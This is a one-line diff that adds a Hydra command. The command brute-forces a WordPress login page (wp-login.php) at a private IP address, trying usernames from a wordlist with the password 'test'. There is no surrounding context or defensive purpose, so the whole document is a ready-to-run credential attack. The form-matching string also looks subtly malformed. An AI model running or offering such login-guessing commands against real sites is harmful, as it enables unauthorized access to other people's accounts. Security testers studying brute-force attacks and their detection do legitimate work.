@@ -1,0 +1,1 @@
+hydra -V -L atil.dic -p test 192.168.1.44 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+InF:Invalid username'
